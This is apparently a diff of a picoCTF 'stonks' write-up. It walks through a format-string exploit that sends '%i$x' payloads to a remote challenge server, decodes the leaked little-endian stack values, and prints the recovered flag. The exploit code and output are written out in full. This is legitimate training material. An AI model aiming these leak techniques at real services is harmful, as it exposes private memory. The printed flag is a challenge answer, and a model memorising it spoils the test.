@@ -177,7 +177,7 @@ Now it is just a matter of finding where on the stack is our flag buffer. While 
 
 # pwn script
 
-Using my pwn script template
+Using my [pwn script template](https://github.com/Reaganak40/ctf-writeups/blob/main/scripts/exploit.py), I created a script that will allow me to easily connect remotely and send payloads. I design a payload that will send many *%x* arguments at the vulnerable input. In this case I am also utilizing the *$* specifier with it to print at the numbered argument. To start off, I will look print in hex, the first 30 arguments from the stack.
 
 ```python
 #!/usr/bin/env python3
@@ -202,7 +202,7 @@ io = start()
 
 payload = b""
 
-# flag bytes found at fmt string args $14 to $24
+# print first 30 arguments (integers) from the stack
 for i in range(1, 30):
     payload += f'%{i}$x.'.encode()
 
@@ -221,5 +221,97 @@ leak = io.recvline()
 print(leak)
 
 io.close()
+```
 
+When we execute this script, connecting remotely, and printing what the server sent back to us, we get this byte string.
+
+```
+cicero@cicero-pen:~/Desktop/writeups/picoCTF/stonks$ ./exploit.py REMOTE mercury.picoctf.net 59616
+[+] Opening connection to mercury.picoctf.net on port 59616: Done
+
+b'910c370.804b000.80489c3.f7f10d80.ffffffff.1.910a160.f7f1e110.f7f10dc7.0.910b180.3.910c350.910c370.6f636970.7b465443.306c5f49.345f7435.6d5f6c6c.306d5f79.5f79336e.38343136.34356562.ffbd007d.f7f4baf8.f7f1e440.e9267f00.1.0.\n'
+
+[*] Closed connection to mercury.picoctf.net port 59616
+
+```
+
+Our flag is likely in here, we just aren't viewing it in the typical char format, casting it into a 4 byte integer instead of a 1 byte char. We need to decode this byte buffer
+into an ascii string. Since we are viewing each stack value as an integer, we can expect each stack value to contain 4 chars. So, we need to evaluate each stack value, not as
+a 4 byte integer, but as a 4 byte char array. Since the bytes will be in little-endian we need to reverse the chars. For example:
+
+```
+    Given: 0x67616c66
+
+    1) Evaluate as: 0x67 0x61 0x6c 0x66
+    2) Cast each byte to an ascii char: 'g' 'a' 'l' 'f
+    3) Reverse: 'f' 'l' 'a' 'g'
+    4) result: 'flag'
+```
+
+We modify our script to decode in this way.
+
+
+```python
+# Receive the flag
+leak = io.recvline()
+
+io.close()
+
+# decode flag bytes
+vals = [x.decode() for x in leak.split(b'.')[:-1]]
+
+for i, v in enumerate(vals):
+    if len(v) != 8:
+        v = "0" * (8 - len(v)) + v
+
+    for i in range(7, 0, -2):
+        x = int(f"{v[i-1]}{v[i]}", 16)
+
+        if (x > 32) and x < 126:
+            print(chr(x), end='')
+    print(".", end='')
+```
+
+When we run it remotely we get this as output.
+
+```
+cicero@cicero-pen:~/Desktop/writeups/picoCTF/stonks$ ./exploit.py REMOTE mercury.picoctf.net 59616
+
+[+] Opening connection to mercury.picoctf.net on port 59616: Done
+[*] Closed connection to mercury.picoctf.net port 59616
+
+PD......`!....1..0D.PD.pico.CTF{.I_l0.5t_4.ll_m.y_m0.n3y_.6148.be54.}..@.tz...
+```
+
+We can see the picoCTF{...}, now we just need to pretty it but a bit. I determined the *printf* stack offsets to get to our buffer are between
+arguments **$14** and **$24**. These should also always be full hex values with 8 bytes. Scoping the format string to these offsets, and removing
+the excessive '.' delimiter we get this for our final script.
+
+```python
+# Receive the flag
+leak = io.recvline()
+
+io.close()
+
+# decode flag bytes
+vals = [x.decode() for x in leak.split(b'.')[:-1]]
+
+# print flag
+for i, v in enumerate(vals):
+    if len(v) == 8:
+        for i in range(7, 0, -2):
+            x = int(f"{v[i-1]}{v[i]}", 16)
+
+            if (x > 32) and x < 126:
+                print(chr(x), end='')
+print("\n")
+```
+
+When we run this script we get our flag, clear and neatly formatted.
+
+```
+[+] Opening connection to mercury.picoctf.net on port 59616: Done
+[*] Closed connection to mercury.picoctf.net port 59616
+
+picoCTF{I_l05t_4ll_my_m0n3y_6148be54}
 ```
